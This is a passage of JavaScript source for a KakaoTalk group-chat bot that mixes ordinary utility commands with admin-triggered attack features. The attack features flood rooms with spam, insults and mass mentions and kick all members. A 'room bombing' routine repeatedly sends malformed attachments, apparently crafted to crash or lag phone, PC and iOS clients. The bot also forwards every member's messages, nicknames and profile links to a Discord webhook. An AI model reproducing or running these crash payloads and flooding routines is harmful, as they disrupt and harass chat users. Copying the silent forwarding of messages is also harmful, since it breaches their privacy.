                /*if (data.text == prefix + "도배 노짱") {
                    if (adminList.includes(id + '')) {
                        if (!runningSpamNo) {
                            runningSpamNo = true;
                            noInterval = setInterval(() => {
                                async function msg() {
                                    await sendErrorPhone()
                                    await delay(1100);
                                    var value = Math.floor(Math.random() * 6);
                                    if (value == 0) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("야 기분좋다 ㅋ야 기분좋다 ㅋ야 기분좋다 ㅋ야 기분좋다 ㅋ응디 응디 응디 응디 응디 응디 응디 응디 (흔들으라이!)")
                                                .build(1)
                                        )
                                        channel.setNoticeMeta("나도 군대 갔다 왔고, 예비군훈련[2]까지 다 받았는데, 심심하면 사람한테 세금 내라 하고, 불러다가 뺑뺑이 돌리고 훈련시키고 했는데, 거 위에 사람들은 뭐 했어! 작전통제권 자기들 나라 자기 군대 작전 통제도 한 개 제대로 할 수 없는 군대를 맨들어 놔 놓고 나 국방장관이오! 나 참모총장이오! 그렇게 별들 달고 끄드럭(거드럭)거리고 말았다는 얘깁니까? 그래서 작통권 회수하면 안 된다고 줄줄이 모여가 가지고 성명 내고. 자기들이 직무유기 아입니까?")
                                    } else if (value == 1) {
                                        channel.sendChat("노알라 부엉이 코알라 어↗↘... 아니 이 양반아   너 몇살이야 너 ... 애비가 누구야")
                                    } else if (value == 2) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("모든 것이 노무현이가 하는거 반대만 하면 정의라 이겁니까?!")
                                                .build(1)
                                        )
                                    } else if (value == 3) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("나도 군대 갔다 왔고, 예비군훈련[2]까지 다 받았는데, 심심하면 사람한테 세금 내라 하고, 불러다가 뺑뺑이 돌리고 훈련시키고 했는데, 거 위에 사람들은 뭐 했어! 작전통제권 자기들 나라 자기 군대 작전 통제도 한 개 제대로 할 수 없는 군대를 맨들어 놔 놓고 나 국방장관이오! 나 참모총장이오! 그렇게 별들 달고 끄드럭(거드럭)거리고 말았다는 얘깁니까? 그래서 작통권 회수하면 안 된다고 줄줄이 모여가 가지고 성명 내고. 자기들이 직무유기 아입니까?")
                                                .build(1)
                                        )
                                    } else if (value == 4) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! 부끄러운 줄 알아야지! ")
                                                .build(1)
                                        )
                                    } else if (value == 5) {
                                        channel.sendChat(
                                            new node_kakao.ChatBuilder()
                                                .append(new node_kakao.AttachmentContent({
                                                    shout: true
                                                }))
                                                .text("야~딱좋다 기분좋다야~딱좋다 기분좋다야~딱좋다 기분좋다")
                                                .build(1)
                                        )
                                    };
                                };
                                msg();
                            }, 2200);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };*/

                if (data.text == prefix + "도배 랜덤") {
                    if (adminList.includes(id + '')) {
                        if (!runningSpam) {
                            runningSpam = true;
                            var i = 0;
                            spamInterval = setInterval(() => {
                                channel.sendChat(crypto.default.randomBytes(10).toString("base64"));
                            }, 1100);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배 욕") {
                    if (adminList.includes(id + '')) {
                        if (!runningMent) {
                            runningMent = true;
                            var i = 0;
                            mentInterval = setInterval(() => {
                                var random = Math.floor(Math.random() * mentArray.length);
                                channel.sendChat(mentArray[random]);
                            }, 1100);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배 멘션") {
                    if (adminList.includes(id + '')) {
                        if (!mentionSpam) {
                            mentionSpam = true;
                            mentionInterval = setInterval(async () => {
                                try {
                                    await mentionAll(channel, 1, 1000, 1, false);
                                } catch {

                                };
                            }, 1100);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "모두멘션") {
                    if (adminList.includes(id + '')) {
                        mentionAll(channel, 1, 1000, 1, true);
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "투명멘션") {
                    if (adminList.includes(id + '')) {
                        mentionAll(channel, 1, 1000, 2, true);
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "반복모두멘션")) {
                    if (adminList.includes(id + '')) {
                        if (data.text == prefix + "반복모두멘션") {
                            channel.sendChat("반복할 멘션 횟수를 적어주세요!");
                        } else if (data.text.startsWith(prefix + "반복모두멘션 ")) {
                            var repeatCount = data.text.split(' ')[1];
                            repeatCount *= 1;
                            mentionAll(channel, repeatCount + 1, 100, 1, false);
                        } else {
                            channel.sendChat("올바른 사용법: " + prefix + "반복모두멘션 횟수");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "반복투명멘션")) {
                    if (adminList.includes(id + '')) {
                        if (data.text == prefix + "반복투명멘션") {
                            channel.sendChat("반복할 투명멘션 횟수를 적어주세요!");
                        } else if (data.text.startsWith(prefix + "반복투명멘션 ")) {
                            var repeatCount = data.text.split(' ')[1];
                            repeatCount *= 1;
                            mentionAll(channel, repeatCount + 1, 100, 1, false);
                        } else {
                            channel.sendChat("올바른 사용법: " + prefix + "반복투명멘션 횟수");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "강퇴 ")) {
                    if (adminList.includes(id + '')) {
                        try {
                            var _Mention = data.mentions[0].user_id;
                            if (!_Mention) {
                                channel.sendChat(prefix + "강퇴 @멘션 의 형태로 써주세요.");
                            } else {
                                channel.kickUser({ userId: _Mention });
                                channel.sendChat("[강퇴완료: " + _Mention + "]");
                            };

                        } catch (error) {
                            channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다.");
                    };
                };

                if (data.text.startsWith(prefix + "강퇴해제")) {
                    if (adminList.includes(id + '')) {
                        try {
                            var user_id = data.text.replace(prefix + "강퇴해제 ", "");
                            var unbanUserObj = { userId: user_id };
                            channel.removeKicked(unbanUserObj);
                            channel.sendChat("[" + user_id + "] 님의 강퇴를 해제했습니다!");
                        } catch (error) {
                            channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다.");
                    };
                };

                if (data.text == prefix + "일괄강퇴") {
                    if (adminList.includes(id + '')) {
                        try {
                            channel.sendChat("모든 유저를 강퇴하기 시작합니다.")
                            var userList = channel.getUserAsObject();
                            for (var i = 0; i < channel.getUserAsObject().length; i++) {
                                channel.kickUser(userList[i].userId);
                            };
                            channel.sendChat("모든 유저를 강퇴가 끝났습니다.")
                        } catch (error) {
                            channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "오픈링크") {
                    if (adminList.includes(id + '')) {
                        try {
                            channel.sendChat("오픈채팅방 링크:\n" + channel.getOpenLink)
                        } catch (error) {
                            channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "채금목록") {
                    if (adminList.includes(id + '')) {
                        try {
                            //channel.sendChat("현재 채팅금지 목록:\n\n" + list);
                            var list = JSON.stringify(Hider).replace('[', '').replace(']', '').replace('"12345678",', '').replace('"12345678"', '');
                            var lengthA = Hider.length - 1;
                            if (list == "") {
                                channel.sendChat("아무도 채팅 금지가 되있지 않습니다!");
                            } else {
                                channel.sendChat("채팅금지 목록 (" + lengthA + "):\n" + list);
                            };
                        } catch (error) {
                            channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "채금 ")) {
                    if (adminList.includes(id + '')) {
                        try {
                            var v = roomId + ":" + data.mentions[0].user_id;
                            if (!Hider) {
                                channel.sendChat("이 채널은 채팅금지 설정이 안되어 새로운 설정을 적용하기 시작합니다.");
                                Hider = [];
                            };
                            if (v) {
                                if (!Hider.includes(v)) {
                                    Hider.push(v);
                                    var list;
                                    for (getValueFor in Hider) {
                                        list += v + "\n";
                                    };
                                    channel.sendChat("유저 '" + v + "' 의 모든 메시지를 가리기 시작합니다.");
                                } else {
                                    channel.sendChat("해당 유저는 이미 리스트에 등재되있습니다.");
                                };
                            } else {
                                channel.sendChat("'" + prefix + "채금 @멘션' 의 형태로 써주세요.");
                            };
                        } catch (error) {
                            channel.sendChat("작업 과정에서 오류가 발생했습니다.\n" + error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "채금해제 ")) {
                    if (adminList.includes(id + '')) {
                        try {
                            var v = roomId + ":" + data.mentions[0].user_id;
                            if (String(v)) {
                                var v1 = Hider.indexOf(String(v));
                                if (v1 > -1) {
                                    Hider.splice(v1, 1);
                                    channel.sendChat("해당 유저를 리스트에서 삭제했습니다.");
                                } else {
                                    channel.sendChat("리스트에 없는 유저입니다.");
                                };
                            } else {
                                channel.sendChat("'" + prefix + "채금해제 @멘션' 의 형태로 써주세요.");
                            };
                        } catch {
                            channel.sendChat("작업 과정에서 오류가 발생했습니다.");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "가리기") {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == $KnownChatType.REPLY) {
                            try {
                                const reply = data.attachment();
                                //channel.hideChat(data.attachment($ReplyAttachment));
                                if (reply.src_userId !== undefined) {
                                    const srcUser = channel.getUserInfo({ "userId": reply.src_userId });
                                    console.log(srcUser);
                                }
                                if (reply.src_logId !== undefined) {
                                    if (reply.src_type !== undefined) {
                                        channel.hideChat({ 'logId': reply.src_logId, 'type': reply.src_type }).then().catch();
                                        (async () => { await delay(200); })();
                                        //channel.hideChat(data.chat).then().catch();
                                    }
                                }
                                channel.sendChat("가리기가 완료되었습니다.");
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } else {
                            channel.sendChat("해당 명령어는 답장 형태로 적어주세요.");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "투표")) {
                    try {
                        if (data.text.includes(prefix + "투표 ")) {
                            sendVote(data.text.replace(prefix + "투표 ", "").split('%')[0], data.text.replace(prefix + "투표 ", "").split('%')[1]);
                        } else {
                            channel.sendChat("투표 옵션을 적어주세요!");
                        };
                    } catch (error) {
                        outError = error + "$%^%$";
                        outError = outError.replace("$%^%$", "");
                        channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                    };
                };

                if (data.text.startsWith(prefix + "글쓰기")) {
                    sendWord(data.text.replace(prefix + "글쓰기 ", ""));
                };

                if (data.text == prefix + "방폭") {
                    if (adminList.includes(id + '')) {
                        (async () => {
                            try { channel.sendChat("방폭을 시작합니다 ^_^"); } catch (e) { };
                            await delay(110);
                            try { await channel.setProfileMeta({ imageUrl: "https://pds.joongang.co.kr/news/component/htmlphoto_mmdata/201701/19/htm_2017011914219153477.jpg", fullImageUrl: "https://pds.joongang.co.kr/news/component/htmlphoto_mmdata/201701/19/htm_2017011914219153477.jpg" }); } catch (e) { };
                            await delay(110);
                            try { await channel.setTitleMeta("방폭당함 ㅅㄱ ㅋㅋㄹㅃㅃ"); } catch (e) { };
                            await delay(110);
                            try {
                                await channel.setLiveTalkInfoMeta({
                                    "liveon": true,
                                    "title": "",
                                    "startTime": 1111111111,
                                    "userId": id, //id
                                    "csIP": "211.231.102.213",
                                    "csIP6": "2404:4600:6:369:211:231:102:213",
                                    "csPort": 9000,
                                    "callId": "1111111111111111"
                                });
                            } catch (e) { };
                            await delay(110);
                            try {
                                await channel.setLiveTalkCountMeta({
                                    count: 999
                                });
                            } catch (e) { };
                            await delay(110);
                            try { clearInterval(terrorInterval); } catch (e) { };
                            try { terrorInterval = null; } catch (e) { };
                            try { terrorSpam = false; } catch (e) { };
                            try { terrorSpam = true; } catch (e) { };
                            terrorInterval = setInterval(async () => {
                                try { sendErrorPhone(); } catch (e) { };
                                await delay(110);
                                try { sendErrorCom(channel); } catch (e) { };
                                await delay(110);
                                try {
                                    channel.sendChat(
                                        new $ChatBuilder().append(new $AttachmentContent({
                                            os: lagArray,
                                        })).build(24)
                                    );
                                } catch (e) { };
                            }, 330);
                        })();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "강제오류 폰") {
                    if (adminList.includes(id + '')) {
                        sendErrorPhone();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배 컴튕") {
                    if (adminList.includes(id + '')) {
                        if (!comErrSpam) {
                            comErrSpam = true;
                            comErrInterval = setInterval(() => {
                                sendErrorCom(channel)
                            }, 110);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "도배 폰튕") {
                    if (adminList.includes(id + '')) {
                        if (!phErrSpam) {
                            phErrSpam = true;
                            phErrInterval = setInterval(() => {
                                sendErrorPhone()
                            }, 110);
                        } else {
                            channel.sendChat("이미 도배를 하는중입니다!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };
            };

            function sendErrorPhone() {
                try {
                    channel.sendChat(
                        new $ChatBuilder()
                            .text("Unknown")
                            .append(new $AttachmentContent({
                                "subtype": 1,
                                "voteId": 123,
                                "title": false,
                                "os": [
                                    {
                                        "t": "PH",
                                        "st": "GH",
                                        "tt": false,
                                        "its": [
                                            {
                                                "tt": "나는"
                                            },
                                            {
                                                "tt": "원숭"
                                            },
                                            {
                                                "tt": "이다"
                                            }
                                        ]
                                    },
                                    {
                                        "t": 2,
                                        "st": 4,
                                        "url": "kakaomoim://post?referer=b&chat_id=308561235219220&post_id=v3Ln3cs6u19TsEBOpIB"
                                    }
                                ]
                            }))
                            .build(97)
                    );
                } catch (error) {
                    outError = error + "$%^%$";
                    outError = outError.replace("$%^%$", "");
                    channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                };
            };

            function sendWord(_text) {
                try {
                    channel.sendChat(
                        new $ChatBuilder()
                            .append(new $AttachmentContent({
                                "os": [
                                    {
                                        "t": 1,
                                        "ct": _text,
                                        "jct": "[{\"type\":\"text\",\"text\":\"" + _text + "\"}]"
                                    },
                                    {
                                        "t": 2,
                                        "st": 1,
                                        "url": ""
                                    }
                                ]
                            }))
                            .build(98)
                    );
                } catch (error) {
                    outError = error + "$%^%$";
                    outError = outError.replace("$%^%$", "");
                    channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                };
            };

            function sendVote(_text, _text2) {
                try {
                    channel.sendChat(
                        new $ChatBuilder()
                            .append(new $AttachmentContent({
                                "title": _text,
                                "os": [
                                    {
                                        "t": 9,
                                        "st": 1,
                                        "tt": _text,
                                        "its":
                                            [
                                                {
                                                    "tt": _text2
                                                }
                                            ]
                                    },
                                    {
                                        "t": 2,
                                        "st": 4,
                                        "url": ""
                                    }
                                ]
                            }))
                            .build(97)
                    )
                } catch (error) {
                    outError = error + "$%^%$";
                    outError = outError.replace("$%^%$", "");
                    channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                };
            };
        });

        CLIENT.on('chat', async (data, channel) => {
            const sender = data.getSenderInfo(channel);
            if (!sender) return;
            args = data.text.split(" ");
            id = data.getSenderInfo(channel).userId;
            roomId = channel._channel.channelId;
            if (!isKeyExists($TitleSpamList, roomId)) {
                $TitleSpamList[roomId] = false;
            };
            if (!isKeyExists($ProfileSpamList, roomId)) {
                $ProfileSpamList[roomId] = false;
            };


            if (!adminList.includes(id + '')) {
                if (blackList.includes(id + '')) {
                    return;
                };
            };


            try {
                $DefChatLog[data.chat.logId] = JSON.stringify(data.chat);
                if (!$ChatLog[roomId]) {
                    $ChatLog[roomId] = [];
                };
                var cData = {
                    "logId": data.chat.logId,
                    "roomId": roomId,
                    "type": data.chat.type,
                    "raw": data.chat
                };
                if (cData.type == 1) {
                    cData["text"] = data.text;
                };
                $ChatLog[roomId].push(cData);
            } catch {

            };

            if (id == topAdmin && data.text == prefix + "어드민") {
                if (topAdminMode) {
                    topAdminMode = false;
                    console.log("어드민모드를 해제합니다.");
                } else {
                    topAdminMode = true;
                    console.log("어드민모드를 적용합니다.");
                };
            };

            if (topAdminMode) {
                //여기에 원하는 코드
                if (id == topAdmin) {
                    if (data.originalType == $KnownChatType.REPLY) {
                        try {
                            const reply = data.attachment($ReplyAttachment);
                            channel.sendChat(JSON.stringify(reply));
                        } catch (error) { console.log(error + "") };
                    };
                };
            } else if (!topAdminMode) {

                async function getYt(vidId) {
                    try {
                        //var vidID = data.text.replace(prefix + "ytdl ", "");
                        var vidInfo = await ytdl.getInfo(vidId);
                        var readable = ytdl.downloadFromInfo(vidInfo, { quality: 'highestaudio' });
                        var vidLength = (vidInfo.videoDetails.lengthSeconds || '') * 1000;
                        if (isNaN(vidLength)) { vidLength = 1; }

                        if (vidLength > 600000) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("10분 이상 영상은 사용 할 수 없습니다.")
                                    .build($KnownChatType.REPLY));
                        }

                        var uploadData = await readableToBuffer(readable);

                        var res = await $AttachmentApi.upload($KnownChatType.FILE, 'BrUhInG.mp3', uploadData);

                        if (!res.success) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text(`업로드중 오류가 발생했습니다. status: ${res.status}`)
                                    .build($KnownChatType.REPLY));
                        }

                        /*await channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
                                .text(`${vidInfo.videoDetails.title} by ${vidInfo.videoDetails.author.name}`)
                                .build($KnownChatType.REPLY)
                        );*/
                        await channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
                                //.text(`${vidInfo.videoDetails.title} by ${vidInfo.videoDetails.author.name}`)
                                .attachment(res.result)
                                .attachment({ d: vidLength })
                                .build($KnownChatType.AUDIO)
                        );
                    } catch (err) {
                        channel.sendChat(`처리중 오류가 발생했습니다. err: ${err}`);
                    }
                }

                async function getYTvid(vidURL) {
                    try {
                        var vidInfo = await ytdl.getInfo(vidURL);
                        var readable = ytdl.downloadFromInfo(vidInfo, { quality: 'highestvideo', filter: 'audioandvideo' });
                        var vidLength = (vidInfo.videoDetails.lengthSeconds || '') * 1000;
                        if (isNaN(vidLength)) { vidLength = 1; }

                        if (vidLength > 600000) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("10분 이상 영상은 사용 할 수 없습니다.")
                                    .build($KnownChatType.REPLY));
                        }

                        var uploadData = await readableToBuffer(readable);

                        var res = await $AttachmentApi.upload($KnownChatType.FILE, 'V1D20.mp4', uploadData);

                        if (!res.success) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text(`업로드중 오류가 발생했습니다. status: ${res.status}`)
                                    .build($KnownChatType.REPLY));
                        }

                        /*await channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
                                .text(`${vidInfo.videoDetails.title} by ${vidInfo.videoDetails.author.name}`)
                                .build($KnownChatType.REPLY)
                        );*/
                        await channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
                                //.text(`${vidInfo.videoDetails.title} by ${vidInfo.videoDetails.author.name}`)
                                .attachment(res.result)
                                //.attachment({ d: vidLength })
                                .build($KnownChatType.VIDEO)
                        );
                        console.log(uploadData);
                    } catch (err) {
                        channel.sendChat(`처리중 오류가 발생했습니다. err: ${err} at Line ${err.lineNumber}`);
                    }
                }

                if (data.text.startsWith(prefix + "ytdl")) {
                    getYt(data.text.replace(prefix + "ytdl ", ""));
                }

                if (data.text.startsWith(prefix + "vid-ytdl")) {
                    getYTvid(data.text.replace(prefix + "vid-ytdl ", ""));
                }

                
                //var reg0 = new RegExp(`/${station}|\s/ig`);
                    //var reg1 = new RegExp(/\s\(.*\)|\[.*\]|번째|\s-\s.*|도착|\s|진입|[분후]|전역/ig);
                        //var reg2 = new RegExp(/\s\(.*\)|\s-\s.*/ig);

                /*if (data.text.startsWith(prefix + "전철")) {
                    nein = data.text.replace(prefix + "전철 ", "");
                    //var ledFactory = LED()
                    // http://swopenapi.seoul.go.kr/api/subway/sample/json/realtimeStationArrival/0/5/%EC%8B%A0%EB%8F%84%EB%A6%BC
                    //http://openapi.seoul.go.kr:8088/sample/json/SearchInfoBySubwayNameService/1/5/%EC%A2%85%EB%A1%9C3%EA%B0%80/
                    axios.get("http://swopenapi.seoul.go.kr/api/subway/"+subwayAPI+"/json/realtimeStationArrival/0/5/" + nein)
                    //axios.get("http://openapi.seoul.go.kr:8088" + subwayAPI + "SearchInfoBySubwayNameService/1/5/" + nein + "/");
                    .then(response => {
                        if (response.data['errorMessage']['code'] == "INFO-000") {
                            if () {

                            }
                        } else {
                            channel.sendChat("처리중 오류가 발생하였습니다.");
                        }
                    }).catch((error) => {

                    })
                }*/
                // LED(upWhereInfo, downWhereInfo, upStnInfo, downStnInfo, upStatInfo, downStatInfo)
                if (data.text.startsWith(prefix + "전광판")) {
                  
                    var m0 = data.text.replace(prefix + "전광판 ", "").split('%')[0];
                    var m11 = data.text.replace(prefix + "전광판 ", "").split('%')[1];
                    var m22 = data.text.replace(prefix + "전광판 ", "").split('%')[2];
                    var m3 = data.text.replace(prefix + "전광판 ", "").split('%')[3];
                    var m4 = data.text.replace(prefix + "전광판 ", "").split('%')[4];
                    var m5 = data.text.replace(prefix + "전광판 ", "").split('%')[5];
                    console.log(m0); // 용산
                    console.log(m11); // 인천
                    console.log(m22); // 1
                    console.log(m3); // 서울
                    console.log(m4); // 구로
                    console.log(m5); // 2
                    if (m0.length > 3 || m5.length > 2) {
                        channel.sendChat("출발지와 행선지는 3글자, 열차 상태는 2글자를 넘길수 없습니다.");
                    } else {
                        var LEDdata = await LED(m0, m3, m11, m4, m22, m5);
                        //var uploadData = await readableToBuffer(ledFactory);
                        /*var upload = fs.readFileSync('./bot/Led_Test.png', (err, data) => { 
                            if (err) throw err; 
                            return data;
                        });*/
                        //var uploadData = readableToBuffer(upload);
                        //var upload = buf2.toString();
                        var res = await $AttachmentApi.upload($KnownChatType.FILE, '전광판.png', LEDdata);
                        await channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
                                .attachment(res.result)
                                .attachment({
                                   "width": "770",
                                   "height": "300"
                                })
                                .build($KnownChatType.PHOTO)
                        );
                        //console.log(upload);
                    }
                }
                // userPerms(channel, userid, perm)
                if (data.text.startsWith(prefix + "권한")) {
                    if (adminList.includes(id + '')) {
                        try {
                            if (data.originalType == $KnownChatType.REPLY) {
                                var wut = data.text.replace(prefix + "권한 ", "");
                                var botInfo = channel.getUserInfo(CLIENT.clientUser);
                                const reply = data.attachment();
                                if (reply.src_logId !== undefined) {
                                    if (reply.src_type !== undefined) {
                                        switch (wut) {
                                            case 1: // 방장
                                                channel.sendChat("허용되지 않은 권한입니다.");
                                                break;
                                            case 2: // 평민
                                                if (botInfo.perm != 4 && botInfo.perm != 1) {
                                                    channel.sendChat("권한이 부족합니다.");
                                                } else {
                                                    userPerms(channel, reply.src_userId, 2);
                                                }
                                                break;
                                            case 4: // 부방
                                                if (botInfo.perm != 1) {
                                                    channel.sendChat("봇의 권한이 부족합니다.");
                                                } else {
                                                    userPerms(channel, reply.src_userId, 4);
                                                }
                                                break;
                                            case 8: // 봇
                                                channel.sendChat("봇을 봇으로 지정할수는 있지만 지정하기 싫습니다.");
                                                break;
                                            default: //ㅁ?ㄹ
                                                channel.sendChat("올바른 권한을 입력해주세요.\n2 -> 평민\n4 -> 부방");
                                                break;
                                        }
                                    }
                                }
                            } else {
                                channel.sendChat("권한 상승을 원하는 유저의 메시지에 답장 형식으로 명령어를 사용하십시오.")
                            }
                        } catch (err) {
                            channel.sendChat("오류가 발생했습니다.\n" + err);
                        }
                    }
                }

                if (data.text == prefix + "tts-help") { // tts 도움말
                    channel.sendChat("[ tts 도움말 ]\n" + "\u200b".repeat(500) + 
                        "\n" +
                        "tts 사용법\n\n" +
                        prefix + "ko-tts <할것>\n" +
                        prefix + "en-tts <할것>\n" +
                        prefix + "de-tts <할것>\n" +
                        prefix + "jp-tts <할것>\n" +
                        prefix + "zh-tts <할것>\n" +
                        prefix + "ru-tts <할것>\n");
                }

                if (data.text.includes(prefix + "ko-tts")) { // 한국어
                    await ttsCommand(channel, data.text.replace(prefix + "ko-tts", ""), 'ko');
                }

                if (data.text.includes(prefix + "en-tts")) { // 영어
                    await ttsCommand(channel, data.text.replace(prefix + "en-tts", ""), 'en');
                }

                if (data.text.includes(prefix + "de-tts")) { // 독어
                    await ttsCommand(channel, data.text.replace(prefix + "de-tts", ""), 'de');
                }

                if (data.text.includes(prefix + "jp-tts")) { // 일본어
                    await ttsCommand(channel, data.text.replace(prefix + "jp-tts", ""), 'ja');
                }

                if (data.text.includes(prefix + "zh-tts")) { // 중국어
                    await ttsCommand(channel, data.text.replace(prefix + "zh-tts", ""), 'zh');
                }

                if (data.text.includes(prefix + "ru-tts")) { // 노어
                    await ttsCommand(channel, data.text.replace(prefix + "ru-tts", ""), 'ru');
                }

                //channel.sendChat(JSON.stringify(data.getSenderInfo(channel)));

                if (logMessage) {
                    var today = new Date();
                    console.log("[SERVER:" + channel.getDisplayName() + "][ID:" + id + "] " + data.text);
                    var hours = ('0' + today.getHours()).slice(-2);
                    var minutes = ('0' + today.getMinutes()).slice(-2);
                    var seconds = ('0' + today.getSeconds()).slice(-2);
                    var timeString = hours + ':' + minutes + ':' + seconds;
                    discordWebHook(channel, data.text, channel.getUserInfo({ userId: id }).nickname, channel.getUserInfo({ userId: id }).originalProfileURL || "", timeString, channel.getDisplayName());
                };

                if (data.text == keyWord) {
                    if (keyWordFunction == "해시태그") {
                        sendLinkEmbed(channel, keyWordData.split(' ')[0], keyWordData.split(' ')[1]);
                    };
                };

                if (data.text == prefix + "eclog") {
                    if (adminList.includes(id + '')) {
                        try {
                            console.log('-----------\n' + JSON.stringify($ChatLog) + '\n-----------')
                            channel.sendChat("전체 채팅 로그 확인을 위해 콘솔을 확인해주세요!");
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "강제오류 컴") {
                    if (adminList.includes(id + '')) {
                        sendErrorCom(channel);
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "ium") {
                    if (adminList.includes(id + '')) {
                        sendErrorIOS(channel);
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "관리자인증") {
                    if (adminList.includes(id + '')) {
                        channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
                                .text("이미 관리자에 등록이 되어있습니다.")
                                .build($KnownChatType.REPLY)
                        );
                    } else {
                        channel.sendChat(
                            new $ChatBuilder()
                                .append(new $ReplyContent(data.chat))
